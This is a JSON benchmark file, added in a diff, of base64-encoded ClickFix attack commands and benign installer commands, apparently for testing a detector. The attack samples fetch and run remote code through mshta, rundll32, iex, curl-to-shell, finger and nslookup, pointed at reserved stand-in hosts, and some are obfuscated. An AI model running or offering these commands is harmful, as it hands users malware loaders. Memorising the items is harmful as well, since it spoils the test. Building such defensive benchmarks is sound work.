@@ -1,0 +1,414 @@
+{
+ "note": "ClickFix First Aid benchmark samples. Every attack sample is defanged: hosts are reserved names (example.invalid) or documentation addresses (203.0.113.0/24), and encoded payloads decode to harmless text. Samples are base64-encoded (UTF-8) because antivirus programs flag readable attack text. None of these samples was part of the project's test suite when the benchmark was first run (6 November 2026).",
+ "kinds": {
+  "V": "command shape as published, with indicators replaced by reserved names",
+  "V+": "published command with a truncated tail completed for this benchmark",
+  "R": "reconstructed from a published description; no full command was published"
+ },
+ "sources": {
+  "bt": {
+   "title": "blueteam.cool, \"ClickFix in 2026: Eight Ways to Start the Same Attack\" (1 Aug 2026)",
+   "url": "https://blueteam.cool/posts/clickfix-2026-stage0/"
+  },
+  "cp": {
+   "title": "CyberProof, \"ClickFix Keeps Evolving: Rundll32 Ordinal Execution over WebDAV\" (28 Jul 2026)",
+   "url": "https://www.cyberproof.com/blog/clickfix-keeps-evolving-rundll32-ordinal-execution-over-webdav/"
+  },
+  "dc": {
+   "title": "Detection Chokepoints, \"ClickFix Techniques\" (compiling Huntress, Atos, Push Security, Microsoft, BleepingComputer reports)",
+   "url": "https://iimp0ster.github.io/detection-chokepoints/chokepoints/clickfix-techniques/"
+  },
+  "ms-crash": {
+   "title": "Microsoft Threat Intelligence, \"New ClickFix variant CrashFix\" (5 Feb 2026)",
+   "url": "https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan/"
+  },
+  "ms-mac": {
+   "title": "Microsoft Threat Intelligence, \"ClickFix campaign uses fake macOS utilities lures\" (6 May 2026)",
+   "url": "https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/"
+  },
+  "risac": {
+   "title": "Ransom-ISAC, \"MacOS ClickFix AMOS Campaign\" (17 Sep 2026)",
+   "url": "https://ransom-isac.org/blog/macos-clickfix-amos-campaign/"
+  },
+  "thn-pals": {
+   "title": "The Hacker News, on Bert-Jan Pals' analysis of about 3,000 live ClickFix payloads (1 Jul 2026)",
+   "url": "https://thehackernews.com/2026/07/researcher-analyzes-3000-live-clickfix.html"
+  },
+  "kasp": {
+   "title": "Kaspersky, \"Variations of the ClickFix\"",
+   "url": "https://www.kaspersky.com/blog/clickfix-attack-variations/55340/"
+  }
+ },
+ "attacks": [
+  {
+   "id": "H01",
+   "name": "pcalua launching mshta",
+   "os": "win",
+   "kind": "V",
+   "source": "bt",
+   "b64": "cGNhbHVhLmV4ZSAtYSBtc2h0YS5leGUgLWMgaHR0cHM6Ly92ZXJpZnkuZXhhbXBsZS5pbnZhbGlkL2NoZWNrLmh0YQ=="
+  },
+  {
+   "id": "H02",
+   "name": "pcalua, PowerShell, caret-split mshta URL",
+   "os": "win",
+   "kind": "V",
+   "source": "bt",
+   "b64": "cGNhbHVhLmV4ZSAtYSAiUG93ZXJTaGVsbCIgLWMgInNhcHMgY21kICcvdi9jIG1ec15oXnReYSBoXnRedF5wXnNeOl4vXi92ZXJpZnkuZXhhbXBsZS5pbnZhbGlkL2MnIC1XaSBIaSI="
+  },
+  {
+   "id": "H03",
+   "name": "forfiles building \"powershell\" from variables",
+   "os": "win",
+   "kind": "V",
+   "source": "bt",
+   "b64": "Zm9yZmlsZXMuZXhlIC9wIEM6XFdpbmRvd3NcU3lzdGVtMzIgL20gbm90ZXBhZC5leGUgL2MgImNtZCAvdjpvbiAvYyBzZXQgcD1wb3cmc2V0IGU9ZXJzaGUmc2V0IGw9bGwmIXAhIWUhIWwhIC1XSSAxIC1ub3AgLWMgaWV4KGlybSBodHRwczovL2Nkbi5leGFtcGxlLmludmFsaWQvcyki"
+  },
+  {
+   "id": "H04",
+   "name": "finger response run by cmd (caret-split)",
+   "os": "win",
+   "kind": "V",
+   "source": "bt",
+   "b64": "Y21kIC9LIGZvciAvZiAiZGVsaW1zPUAiICVvIGluICgnLGZeaV5uXmdeZV5yIDQ0NzFAZl5pXm5eZ15lXnJeLmV4YW1wbGUuaW52YWxpZCcpIGRvICVv"
+  },
+  {
+   "id": "H05",
+   "name": "headless conhost, WebDAV share, rundll32 by ordinal",
+   "os": "win",
+   "kind": "V",
+   "source": "bt",
+   "b64": "Y29uaG9zdC5leGUgLS1oZWFkbGVzcyAtLSBjbWQgL3Y6b24gL2MgInNldCBzPUBTU0wmcHVec2hkIFxcZmlsZXMuZXhhbXBsZS5pbnZhbGlkIXMhXDZmMWMyYTllICYgcnVebmRsXmwzMiBnb29nLmN0LCMxIg=="
+  },
+  {
+   "id": "H06",
+   "name": "curl download, tar extract, run (three lines)",
+   "os": "win",
+   "kind": "V",
+   "source": "bt",
+   "b64": "Y3VybC5leGUgLXNrU0wgLS1jb21wcmVzc2VkIC0tY3JlYXRlLWRpcnMgLW8gIiVMT0NBTEFQUERBVEElXGE4MWZcYTgxZi5wZGYiIGh0dHBzOi8vY2RuLmV4YW1wbGUuaW52YWxpZC9kCnRhci5leGUgLXhmICIlTE9DQUxBUFBEQVRBJVxhODFmXGE4MWYucGRmIiAtQyAiJUxPQ0FMQVBQREFUQSVcYTgxZiIKIiVMT0NBTEFQUERBVEElXGE4MWZcdXBkYXRlci5leGUi"
+  },
+  {
+   "id": "H07",
+   "name": "pcalua, PowerShell, caret-split pushd and rundll32",
+   "os": "win",
+   "kind": "V",
+   "source": "cp",
+   "b64": "cGNhbHVhLmV4ZSAtYSAiUG93ZXJTaGVsbCIgLWMgInNhcHMgY21kICcvdi9jIHB1XnNoZCBcXGZpbGVzLmV4YW1wbGUuaW52YWxpZEBTU0xcNmYxYzJhOWUgJiYgcnVebmRsbDMyIGoucG0sIzEnIg=="
+  },
+  {
+   "id": "H08",
+   "name": "cmd assembling pushd and rundll32 from variables",
+   "os": "win",
+   "kind": "V",
+   "source": "cp",
+   "b64": "Y21kIC92Om9uIC9jICJzZXQgYT1wdSZzZXQgYj1zaGQmc2V0IGM9cnVuJnNldCBkPWRsbDMyJiBmb3IgJXggaW4gKCFhISFiISkgZG8gQCV4IFxcZmlsZXMuZXhhbXBsZS5pbnZhbGlkQFNTTEA0NDNcNmYxYzJhOWUgJiAhYyEhZCEgZ2Mua2V5LCMxIg=="
+  },
+  {
+   "id": "H09",
+   "name": "headless conhost, curl download, run",
+   "os": "win",
+   "kind": "V+",
+   "source": "dc",
+   "b64": "Y29uaG9zdC5leGUgLS1oZWFkbGVzcyBjbWQgL2MgY2QgL0QgJXVzZXJwcm9maWxlJSAmJiBjdXJsIC1zIC1vIGEuZXhlIGh0dHA6Ly8yMDMuMC4xMTMuMTg4OjgxMTIvYS5leGUgJiYgc3RhcnQgYS5leGU="
+  },
+  {
+   "id": "H10",
+   "name": "FileFix: irm piped to iex, padded label",
+   "os": "win",
+   "kind": "V",
+   "source": "dc",
+   "b64": "cG93ZXJzaGVsbC5leGUgaXJtIHR1bm5lbC5leGFtcGxlLmludmFsaWQvcmh1Z2VpLmpwZyB8IGlleCAjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDYXBjaGEgVmVyaWZ5"
+  },
+  {
+   "id": "H11",
+   "name": "TerminalFix: iwr piped to iex",
+   "os": "win",
+   "kind": "V",
+   "source": "dc",
+   "b64": "aXdyIC11c2ViIGh0dHA6Ly8yMDMuMC4xMTMuMTEzL3Ryb3VibGVzaG9vdC5wczEgfCBpZXg="
+  },
+  {
+   "id": "H12",
+   "name": "TerminalFix (macOS): curl, chmod, bash",
+   "os": "mac",
+   "kind": "V",
+   "source": "dc",
+   "b64": "Y3VybCAtbyB0cm91Ymxlc2hvdC5zaCBodHRwOi8vMjAzLjAuMTEzLjExMy90cm91Ymxlc2hvdC5zaCAmJiBjaG1vZCAreCB0cm91Ymxlc2hvdC5zaCAmJiBiYXNoIHRyb3VibGVzaG90LnNo"
+  },
+  {
+   "id": "H13",
+   "name": "JackFix: XOR-decoded PowerShell",
+   "os": "win",
+   "kind": "V+",
+   "source": "dc",
+   "b64": "cG93ZXJzaGVsbCAtdyBoaWRkZW4gLWVwIGJ5cGFzcyAtYyAiJHY9JzFjMzkyMjNmMmU2NjA0M2UzZjNiM2UzZjZiM2YyZTM4M2YnOyRrPTB4NEI7JGI9W2J5dGVbXV1AKGZvcigkaT0wOyRpIC1sdCAkdi5MZW5ndGg7JGkrPTIpe1tDb252ZXJ0XTo6VG9CeXRlKCR2LlN1YnN0cmluZygkaSwyKSwxNikgLWJ4b3IgJGt9KTtpZXgoW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZygkYikpIg=="
+  },
+  {
+   "id": "H14",
+   "name": "WebDAV drive mapped with net use, script run",
+   "os": "win",
+   "kind": "V",
+   "source": "dc",
+   "b64": "Y21kLmV4ZSAvYyBuZXQgdXNlIFo6IGh0dHA6Ly8yMDMuMC4xMTMuNTUvd2ViZGF2IC9wZXJzaXN0ZW50Om5vICYmICJaOlx1cGRhdGUuY21kIiAmIG5ldCB1c2UgWjogL2RlbGV0ZQ=="
+  },
+  {
+   "id": "H15",
+   "name": "InstallFix (macOS): base64 URL, curl piped to zsh",
+   "os": "mac",
+   "kind": "V",
+   "source": "dc",
+   "b64": "Y3VybCAta3NmTFMgJChlY2hvICdhSFIwY0hNNkx5OWpaRzR1WlhoaGJYQnNaUzVwYm5aaGJHbGtMMms9J3xiYXNlNjQgLUQpfCB6c2g="
+  },
+  {
+   "id": "H16",
+   "name": "InstallFix: mshta by full path",
+   "os": "win",
+   "kind": "V",
+   "source": "dc",
+   "b64": "QzpcV2luZG93c1xTeXNXT1c2NFxtc2h0YS5leGUgaHR0cHM6Ly9hcHAudXBkYXRlLXZlcnNpb24uZXhhbXBsZS5pbnZhbGlkL2FwcA=="
+  },
+  {
+   "id": "H17",
+   "name": "Windows Terminal variant: hidden encoded PowerShell",
+   "os": "win",
+   "kind": "V",
+   "source": "dc",
+   "b64": "cG93ZXJzaGVsbCAtdyBoaWRkZW4gLWVwIGJ5cGFzcyAtZW5jIFZ3QnlBR2tBZEFCbEFDMEFUd0IxQUhRQWNBQjFBSFFBSUFCMEFHVUFjd0IwQUE9PQ=="
+  },
+  {
+   "id": "H18",
+   "name": "DNS variant: nslookup answer run by cmd",
+   "os": "win",
+   "kind": "V+",
+   "source": "dc",
+   "b64": "Y21kIC9jICJmb3IgL2YgInRva2Vucz01IiAlYSBpbiAoJ25zbG9va3VwIGV4YW1wbGUuaW52YWxpZCAyMDMuMC4xMTMuMjAgMl4+bnVsIF58IGZpbmQgIk5hbWUiJykgZG8gY21kIC9jICVhIg=="
+  },
+  {
+   "id": "H19",
+   "name": "DNS variant: nslookup beacon with user name",
+   "os": "win",
+   "kind": "V+",
+   "source": "dc",
+   "b64": "Y21kIC9jICJuc2xvb2t1cCBmZjEyMyVVU0VSTkFNRSUuZG5zMS5leGFtcGxlLmludmFsaWQgJiYgZWNobyBWZXJpZmljYXRpb24gY29tcGxldGUi"
+  },
+  {
+   "id": "H20",
+   "name": "Downloads-folder orchestrator: move, extract, headless run",
+   "os": "win",
+   "kind": "R",
+   "source": "thn-pals",
+   "b64": "cG93ZXJzaGVsbCAtQyAiJHQ9JGVudjpUTVA7IE1vdmUtSXRlbSAnJEhPTUVcRG93bmxvYWRzXGRvY184ODEyLnppcCcgJyR0XDg4MTIuemlwJzsgdGFyIC14ZiAnJHRcODgxMi56aXAnIC1DICR0OyBjb25ob3N0IC0taGVhZGxlc3MgcG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAnJHRccnVuLnBzMSciICMgSSBhbSBub3QgYSByb2JvdCAtIFZlcmlmaWNhdGlvbiBJRDo4ODEy"
+  },
+  {
+   "id": "H21",
+   "name": "CrashFix: finger.exe copied, renamed and run",
+   "os": "win",
+   "kind": "R",
+   "source": "ms-crash",
+   "b64": "Y21kIC9jICJjb3B5ICV3aW5kaXIlXFN5c3RlbTMyXGZpbmdlci5leGUgJXRlbXAlXGN0LmV4ZSAmICV0ZW1wJVxjdC5leGUgZ2NhcHRjaGFAMjAzLjAuMTEzLjMwIHwgY21kIg=="
+  },
+  {
+   "id": "H22",
+   "name": "macOS: fake verification echo, base64 to bash",
+   "os": "mac",
+   "kind": "R",
+   "source": "risac",
+   "b64": "ZWNobyAiSSBhbSBub3QgYSByb2JvdCAtIHJlQ0FQVENIQSBWZXJpZmljYXRpb24gSUQ6IDc3MzEiICYmIGVjaG8gJ1kzVnliQ0F0Y3lCb2RIUndPaTh2TWpBekxqQXVNVEV6TGpJeU5pOXpJQzF2SUM5MGJYQXZMbk1nSmlZZ1kyaHRiMlFnSzNnZ0wzUnRjQzh1Y3lBbUppQnViMmgxY0NBdmRHMXdMeTV6SUQ0dlpHVjJMMjUxYkd3Z01qNG1NU0FtJyB8IGJhc2U2NCAtZCB8IGJhc2ggJiYgY2xlYXIgJiYgZWNobyAiVmVyaWZpY2F0aW9uIHN1Y2Nlc3NmdWwi"
+  },
+  {
+   "id": "H23",
+   "name": "macOS: AppleScript fetched by curl, piped to osascript",
+   "os": "mac",
+   "kind": "R",
+   "source": "ms-mac",
+   "b64": "Y3VybCAtcyAiaHR0cHM6Ly9jZG4uZXhhbXBsZS5pbnZhbGlkL3BheWxvYWQuYXBwbGVzY3JpcHQ/YnVpbGQ9OTFjMiIgfCBvc2FzY3JpcHQ="
+  },
+  {
+   "id": "H24",
+   "name": "Video tutorial lure: iex of irm in admin PowerShell",
+   "os": "win",
+   "kind": "V",
+   "source": "kasp",
+   "b64": "aWV4IChpcm0gaHR0cHM6Ly8yMDMuMC4xMTMuNDAvYWN0aXZhdGUp"
+  },
+  {
+   "id": "H25",
+   "name": "mshta with a remote HTA",
+   "os": "win",
+   "kind": "R",
+   "source": "kasp",
+   "b64": "bXNodGEuZXhlIGh0dHBzOi8vYm9va2luZy12ZXJpZnkuZXhhbXBsZS5pbnZhbGlkL2MuaHRh"
+  }
+ ],
+ "benign": [
+  {
+   "id": "B01",
+   "name": "Bun installer (Windows)",
+   "type": "installer",
+   "source": "https://bun.sh/docs/installation",
+   "b64": "cG93ZXJzaGVsbCAtYyAiaXJtIGJ1bi5zaC9pbnN0YWxsLnBzMXxpZXgi"
+  },
+  {
+   "id": "B02",
+   "name": "Deno installer (Windows)",
+   "type": "installer",
+   "source": "https://docs.deno.com/runtime/getting_started/installation/",
+   "b64": "aXJtIGh0dHBzOi8vZGVuby5sYW5kL2luc3RhbGwucHMxIHwgaWV4"
+  },
+  {
+   "id": "B03",
+   "name": "nvm installer",
+   "type": "installer",
+   "source": "https://github.com/nvm-sh/nvm",
+   "b64": "Y3VybCAtby0gaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL252bS1zaC9udm0vdjAuNDAuMy9pbnN0YWxsLnNoIHwgYmFzaA=="
+  },
+  {
+   "id": "B04",
+   "name": "Ollama installer (Linux)",
+   "type": "installer",
+   "source": "https://ollama.com/download/linux",
+   "b64": "Y3VybCAtZnNTTCBodHRwczovL29sbGFtYS5jb20vaW5zdGFsbC5zaCB8IHNo"
+  },
+  {
+   "id": "B05",
+   "name": "uv installer (macOS and Linux)",
+   "type": "installer",
+   "source": "https://docs.astral.sh/uv/getting-started/installation/",
+   "b64": "Y3VybCAtTHNTZiBodHRwczovL2FzdHJhbC5zaC91di9pbnN0YWxsLnNoIHwgc2g="
+  },
+  {
+   "id": "B06",
+   "name": "PowerShell 7 installer",
+   "type": "installer",
+   "source": "https://learn.microsoft.com/powershell/scripting/install/installing-powershell-on-windows",
+   "b64": "aWV4ICImIHsgJChpcm0gaHR0cHM6Ly9ha2EubXMvaW5zdGFsbC1wb3dlcnNoZWxsLnBzMSkgfSAtVXNlTVNJIg=="
+  },
+  {
+   "id": "B07",
+   "name": "Oh My Posh prompt setup",
+   "type": "plain",
+   "source": "https://ohmyposh.dev/docs/installation/prompt",
+   "b64": "b2gtbXktcG9zaCBpbml0IHB3c2ggfCBJbnZva2UtRXhwcmVzc2lvbg=="
+  },
+  {
+   "id": "B08",
+   "name": "Scoop prerequisite: execution policy",
+   "type": "plain",
+   "source": "https://scoop.sh/",
+   "b64": "U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IFJlbW90ZVNpZ25lZCAtU2NvcGUgQ3VycmVudFVzZXI="
+  },
+  {
+   "id": "B09",
+   "name": "winget: install Git",
+   "type": "plain",
+   "source": "https://git-scm.com/download/win",
+   "b64": "d2luZ2V0IGluc3RhbGwgLS1pZCBHaXQuR2l0IC1lIC0tc291cmNlIHdpbmdldA=="
+  },
+  {
+   "id": "B10",
+   "name": "pnpm global install",
+   "type": "plain",
+   "source": null,
+   "b64": "bnBtIGluc3RhbGwgLWcgcG5wbQ=="
+  },
+  {
+   "id": "B11",
+   "name": "pip upgrade",
+   "type": "plain",
+   "source": null,
+   "b64": "cHl0aG9uIC1tIHBpcCBpbnN0YWxsIC0tdXBncmFkZSBwaXA="
+  },
+  {
+   "id": "B12",
+   "name": "Docker Compose",
+   "type": "plain",
+   "source": null,
+   "b64": "ZG9ja2VyIGNvbXBvc2UgdXAgLWQ="
+  },
+  {
+   "id": "B13",
+   "name": "git clone",
+   "type": "plain",
+   "source": null,
+   "b64": "Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9taWNyb3NvZnQvdnNjb2RlLmdpdA=="
+  },
+  {
+   "id": "B14",
+   "name": "WSL with Ubuntu",
+   "type": "plain",
+   "source": null,
+   "b64": "d3NsIC0taW5zdGFsbCAtZCBVYnVudHU="
+  },
+  {
+   "id": "B15",
+   "name": "Chocolatey package install",
+   "type": "plain",
+   "source": null,
+   "b64": "Y2hvY28gaW5zdGFsbCBnb29nbGVjaHJvbWUgLXk="
+  },
+  {
+   "id": "B16",
+   "name": "Homebrew cask install",
+   "type": "plain",
+   "source": null,
+   "b64": "YnJldyBpbnN0YWxsIC0tY2FzayB2aXN1YWwtc3R1ZGlvLWNvZGU="
+  },
+  {
+   "id": "B17",
+   "name": "apt install",
+   "type": "plain",
+   "source": null,
+   "b64": "c3VkbyBhcHQgdXBkYXRlICYmIHN1ZG8gYXB0IGluc3RhbGwgLXkgbm9kZWpz"
+  },
+  {
+   "id": "B18",
+   "name": "SSH key generation",
+   "type": "plain",
+   "source": "https://docs.github.com/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent",
+   "b64": "c3NoLWtleWdlbiAtdCBlZDI1NTE5IC1DICJ5b3VyX2VtYWlsQGV4YW1wbGUuY29tIg=="
+  },
+  {
+   "id": "B19",
+   "name": "create-next-app",
+   "type": "plain",
+   "source": null,
+   "b64": "bnB4IGNyZWF0ZS1uZXh0LWFwcEBsYXRlc3Q="
+  },
+  {
+   "id": "B20",
+   "name": "file hash check",
+   "type": "plain",
+   "source": null,
+   "b64": "R2V0LUZpbGVIYXNoIC5cc2V0dXAuZXhlIC1BbGdvcml0aG0gU0hBMjU2"
+  },
+  {
+   "id": "B21",
+   "name": "kubectl",
+   "type": "plain",
+   "source": null,
+   "b64": "a3ViZWN0bCBnZXQgcG9kcyAtQQ=="
+  },
+  {
+   "id": "B22",
+   "name": "Python snippet",
+   "type": "plain",
+   "source": null,
+   "b64": "cHJpbnQoIkhlbGxvLCB3b3JsZCEiKQ=="
+  },
+  {
+   "id": "B23",
+   "name": "one-time verification code",
+   "type": "plain",
+   "source": null,
+   "b64": "NDgyOTEz"
+  },
+  {
+   "id": "B24",
+   "name": "support reference with \"verification\" wording",
+   "type": "plain",
+   "source": null,
+   "b64": "VmVyaWZpY2F0aW9uIElEOiA3NzMxLUFYIChxdW90ZSB0aGlzIHdoZW4geW91IGNvbnRhY3Qgc3VwcG9ydCk="
+  }
+ ]
+}
